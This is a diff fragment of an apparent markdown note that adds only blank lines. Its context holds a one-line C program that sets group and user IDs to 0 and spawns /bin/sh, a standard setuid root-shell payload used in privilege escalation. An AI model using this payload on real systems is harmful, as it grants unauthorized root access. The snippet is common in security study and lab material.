@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 ```c
 int main(void) {setgid(0); setuid(0);execl("/bin/sh","sh",0);return 0;}
 ```
+
+
